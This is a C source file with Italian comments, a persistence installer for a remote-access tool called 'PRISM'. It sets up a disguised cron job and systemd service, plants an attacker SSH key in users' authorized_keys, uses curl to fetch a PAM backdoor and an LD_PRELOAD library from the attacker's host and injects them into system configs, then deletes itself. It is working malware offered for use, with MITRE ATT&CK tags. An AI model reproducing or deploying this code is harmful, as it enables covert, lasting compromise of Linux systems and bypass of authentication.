/*
 * persistence_prism.c — Installer persistenza 4-layer per PRISM ICMP C2
 *
 * Layer 1: Cron job  (/etc/cron.d/ con nome sistema)
 * Layer 2: Systemd service (Restart=always, mimicry nome)
 * Layer 3: SSH authorized_keys (accesso diretto da Kali)
 * Layer 4: PAM backdoor (password master su qualsiasi account)
 *
 * MITRE ATT&CK: T1053.003, T1543.002, T1098.004, T1556.003
 *
 * Compilazione: gcc -O2 -o persistence_prism persistence_prism.c
 * Uso:          sudo ./persistence_prism <kali_ip>
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <pwd.h>

/* ── Configurazione ── */
#define RAT_PATH     "/usr/lib/systemd/systemd-network-helper"
#define LOCKFILE     "/tmp/.prism.lock"
#define CRON_FILE    "/etc/cron.d/apt-daily-network"
#define SERVICE_NAME "systemd-network-helper"
#define SERVICE_PATH "/etc/systemd/system/systemd-network-helper.service"

/* ── Step 1: Scarica PRISM da Kali via HTTP ─────────────────
 * Kali deve servire il binary con: python3 -m http.server 80
 */
int download_prism(const char *kali_ip) {
    const char *local_src = "/var/www/html/uploads/prism_static";
    char cmd[512];
    printf("[*] Copia PRISM da %s...\n", local_src);
    snprintf(cmd, sizeof(cmd),
        "/bin/cp %s %s && chmod +x %s",
        local_src, RAT_PATH, RAT_PATH);
    int ret = system(cmd);
    if (ret != 0 || access(RAT_PATH, X_OK) != 0) {
        printf("[!] Copia fallita\n");
        return -1;
    }
    printf("[+] PRISM installato in %s\n", RAT_PATH);
    return 0;
}

/* ── Step 2: Pulisce lockfile stale ───────────────────────── */
void clean_lockfile() {
    FILE *lf = fopen(LOCKFILE, "r");
    if (!lf) return;
    int old_pid;
    fscanf(lf, "%d", &old_pid);
    fclose(lf);
    char proc_path[64];
    snprintf(proc_path, sizeof(proc_path), "/proc/%d", old_pid);
    if (access(proc_path, F_OK) != 0) {
        unlink(LOCKFILE);
        printf("[+] Lockfile stale rimosso\n");
    }
}

/* ── Step 3: Cron Job ────────────────────────────────────────
 * Avvia PRISM ogni 5 minuti se non già in esecuzione
 * MITRE ATT&CK: T1053.003
 */
int install_cron(const char *kali_ip) {
    FILE *f = fopen(CRON_FILE, "w");
    if (!f) { printf("[!] Cron: permesso negato\n"); return -1; }

    fprintf(f, "# Debian network management service\n");
    fprintf(f, "@reboot root rm -f %s\n", LOCKFILE);
    fprintf(f, "*/5 * * * * root pgrep -fx \"%s %s\""
               " > /dev/null || %s %s &\n",
               RAT_PATH, kali_ip, RAT_PATH, kali_ip);
    fclose(f);
    chmod(CRON_FILE, 0644);

    /* Timestamp vecchio — sembra file di sistema */
    system("touch -t 202301010000 " CRON_FILE);

    printf("[+] Cron installato: %s\n", CRON_FILE);
    return 0;
}

/* ── Step 4: Systemd Service ─────────────────────────────────
 * Avvio automatico al boot + Restart=always
 * MITRE ATT&CK: T1543.002
 */
int install_systemd(const char *kali_ip) {
    FILE *f = fopen(SERVICE_PATH, "w");
    if (!f) { printf("[!] Systemd: permesso negato\n"); return -1; }

    fprintf(f, "[Unit]\n");
    fprintf(f, "Description=Network Management Helper\n");
    fprintf(f, "After=network.target\n\n");
    fprintf(f, "[Service]\n");
    fprintf(f, "ExecStartPre=/bin/rm -f %s\n", LOCKFILE);
    fprintf(f, "ExecStart=%s %s\n", RAT_PATH, kali_ip);
    fprintf(f, "Restart=always\n");
    fprintf(f, "RestartSec=60\n");
    fprintf(f, "StandardOutput=null\n");
    fprintf(f, "StandardError=null\n\n");
    fprintf(f, "[Install]\n");
    fprintf(f, "WantedBy=multi-user.target\n");
    fclose(f);

    chmod(SERVICE_PATH, 0644);
    system("systemctl daemon-reload 2>/dev/null");
    system("systemctl enable " SERVICE_NAME " 2>/dev/null");

    printf("[+] Systemd service installato: %s\n", SERVICE_NAME);
    return 0;
}

/* ── Step 5: SSH Authorized Keys ─────────────────────────────
 * Chiave pubblica di Kali per accesso diretto senza password
 * Parsing diretto /etc/passwd (evita getpwent() non funziona
 * con binari statici per via delle dipendenze NSS)
 * MITRE ATT&CK: T1098.004
 */
int install_ssh_key() {
    const char *pubkey =
        "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCRTQ9SWUg55oBG"
        "ebbJJbdz2fVm1UMxnE8TaYJ2D3Wn81iKwCKRNfvtpptsMeoSXBe"
        "Jq2Wz32gFEQ3b5u/Z6PMx81GSfMDgxOBnSdkgYlUG/iNPjFMmKZ"
        "OqOk+GD54GJHZUACU2uwKnpNiNJ1JeFdYROA5bFxdcrR2ZI/vMl7"
        "H4teUBDlZPN0ennlH0B7kBoViOry5b6iC0UDGpG2DI3xsR/4g2Ok"
        "UwOkgNq1cTZxMGkOrxqGhV4LIMxOMPknGXJLaNdp7MOxZaInsUH9"
        "vMnecCs6qNYIiNv7HeDCdn2KaloFhvMj8rJz0wEQLpr9vu6YUzvMD"
        "6akV51iAOe/Rbh7xbf0AHuTBXGdWrBjvt2WaYPm2dd04qoPUMJ/p"
        "DbwjnTf+CSlHhL5ftyNcwsEa8xUHdq9Zb49RHdYA8uv4Qi8GxYMW"
        "8HRpkfv8B8ux0otxgIIRy88lb3iWjaJNYyCRSsHvqZB3CAEcPzE1"
        "G4na9pHu0//JrJu0KfBEFlcNbIvipB7OHBz4NOWahT+YCeLSOtL1"
        "RFJ5ZB4FsQFbrdiuw4fL2ibr1Xtiv42MFeykrKaP/5KTHLxL2T8K"
        "mA+f6AR5r5t/KdNDAsctIrm34ZKtDexaXVigbfy3KSi4e0PVmX/U"
        "u1/YEXy8HzbMqm3tGqqSaF2QKJrwLf5iQLQz3naphUOw3ew== kali@kali";

    /* Parsing diretto /etc/passwd — compatibile con binari statici */
    FILE *passwd_f = fopen("/etc/passwd", "r");
    if (!passwd_f) {
        printf("[!] SSH key: impossibile leggere /etc/passwd\n");
        return -1;
    }

    char line[512];
    while (fgets(line, sizeof(line), passwd_f)) {
        char uname[64], home[256];
        int uid, gid;

        /* Formato: username:x:uid:gid:gecos:home:shell */
        if (sscanf(line, "%63[^:]:%*[^:]:%d:%d:%*[^:]:%255[^:]:%*s",
                   uname, &uid, &gid, home) < 4) continue;

        /* Solo root (0) e utenti normali (>=1000) */
        if (uid != 0 && uid < 1000) continue;
        if (home[0] == '\0' || strcmp(home, "/nonexistent") == 0) continue;

        char ssh_dir[320], auth_keys[320];
        snprintf(ssh_dir,   sizeof(ssh_dir),   "%s/.ssh", home);
        snprintf(auth_keys, sizeof(auth_keys), "%s/authorized_keys", ssh_dir);

        mkdir(ssh_dir, 0700);
        chown(ssh_dir, (uid_t)uid, (gid_t)gid);

        /* Controlla se la chiave è già presente */
        FILE *check = fopen(auth_keys, "r");
        if (check) {
            char kline[512];
            int found = 0;
            while (fgets(kline, sizeof(kline), check))
                if (strstr(kline, "kali@kali")) { found = 1; break; }
            fclose(check);
            if (found) continue;
        }

        FILE *f = fopen(auth_keys, "a");
        if (f) {
            fprintf(f, "\n%s\n", pubkey);
            fclose(f);
            chmod(auth_keys, 0600);
            chown(auth_keys, (uid_t)uid, (gid_t)gid);
            printf("[+] SSH key installata per %s (uid=%d)\n", uname, uid);
        }
    }
    fclose(passwd_f);
    return 0;
}

/* ── Step 6: PAM backdoor ────────────────────────────────────
 * Installa modulo PAM che accetta password master su qualsiasi account
 * MITRE ATT&CK: T1556.003
 */
int install_pam_backdoor(const char *kali_ip) {
    printf("[*] Installazione PAM backdoor...\n");

    char cmd[512];
    snprintf(cmd, sizeof(cmd),
        "/usr/bin/curl -s http://%s/persistence/pam_backdoor.so "
        "-o /lib/x86_64-linux-gnu/security/pam_backdoor.so",
        kali_ip);

    if (system(cmd) != 0 ||
        access("/lib/x86_64-linux-gnu/security/pam_backdoor.so", F_OK) != 0) {
        printf("[!] PAM module non scaricato — skip\n");
        return -1;
    }
    chmod("/lib/x86_64-linux-gnu/security/pam_backdoor.so", 0644);

    const char *pam_configs[] = {
        "/etc/pam.d/sshd", "/etc/pam.d/login",
        "/etc/pam.d/su",   "/etc/pam.d/sudo", NULL
    };
    for (int i = 0; pam_configs[i]; i++) {
        if (access(pam_configs[i], F_OK) != 0) continue;
        char grep_cmd[256];
        snprintf(grep_cmd, sizeof(grep_cmd),
                 "grep -q pam_backdoor.so %s", pam_configs[i]);
        if (system(grep_cmd) == 0) continue;
        char sed_cmd[512];
        snprintf(sed_cmd, sizeof(sed_cmd),
                 "sed -i '1s/^/auth\\tsufficient\\tpam_backdoor.so\\n/' %s",
                 pam_configs[i]);
        system(sed_cmd);
        printf("[+] PAM backdoor aggiunta a %s\n", pam_configs[i]);
    }
    return 0;
}

/* ── Step 6b: LD_PRELOAD ─────────────────────────────────────
 * Aggiunge ldpreload_prism.so a /etc/ld.so.preload
 * La libreria viene caricata in ogni processo e riavvia PRISM
 * se non è in esecuzione (watchdog passivo)
 * MITRE ATT&CK: T1574.006
 */
int install_ldpreload(const char *kali_ip) {
    const char *so_dest = "/usr/lib/x86_64-linux-gnu/libsystem-network.so";

    printf("[*] Installazione LD_PRELOAD...\n");

    char cmd[512];
    snprintf(cmd, sizeof(cmd),
        "/usr/bin/curl -s http://%s/persistence/ldpreload_prism.so -o %s",
        kali_ip, so_dest);

    if (system(cmd) != 0 || access(so_dest, F_OK) != 0) {
        printf("[!] LD_PRELOAD: download fallito — skip\n");
        return -1;
    }
    chmod(so_dest, 0644);

    /* Aggiunge a /etc/ld.so.preload se non già presente */
    FILE *check = fopen("/etc/ld.so.preload", "r");
    if (check) {
        char line[256];
        int found = 0;
        while (fgets(line, sizeof(line), check))
            if (strstr(line, "libsystem-network.so")) { found = 1; break; }
        fclose(check);
        if (found) {
            printf("[*] LD_PRELOAD già presente\n");
            return 0;
        }
    }

    FILE *f = fopen("/etc/ld.so.preload", "a");
    if (!f) { printf("[!] LD_PRELOAD: impossibile scrivere\n"); return -1; }
    fprintf(f, "%s\n", so_dest);
    fclose(f);

    printf("[+] LD_PRELOAD installato: %s\n", so_dest);
    return 0;
}

/* ── Step 7: Avvia PRISM ─────────────────────────────────── */
void start_prism(const char *kali_ip) {
    printf("[*] Avvio PRISM...\n");
    clean_lockfile();
    char cmd[256];
    snprintf(cmd, sizeof(cmd), "%s %s &", RAT_PATH, kali_ip);
    system(cmd);
    sleep(1);
    printf("[+] PRISM avviato\n");
}

/* ── Step 8: Auto-cancellazione ─────────────────────────── */
void self_delete(const char *self_path) {
    pid_t pid = fork();
    if (pid == 0) { sleep(1); unlink(self_path); _exit(0); }
    printf("[+] Installer rimosso\n");
}

/* ── Main ─────────────────────────────────────────────────── */
int main(int argc, char *argv[]) {
    if (argc < 2) {
        fprintf(stderr, "Uso: %s <kali_ip>\n", argv[0]);
        return 1;
    }
    if (geteuid() != 0) {
        fprintf(stderr, "[!] Richiede root\n");
        return 1;
    }

    const char *kali_ip = argv[1];

    printf("[*] PRISM Persistence Installer\n");
    printf("[*] C2: %s\n\n", kali_ip);

    download_prism(kali_ip);
    install_cron(kali_ip);
    install_systemd(kali_ip);
    install_ssh_key();
    install_ldpreload(kali_ip);
    install_pam_backdoor(kali_ip);
    start_prism(kali_ip);
    if (argc > 0) self_delete(argv[0]);

    printf("\n[+] Persistenza PRISM installata — 5 layer attivi\n");
    _exit(0);
}
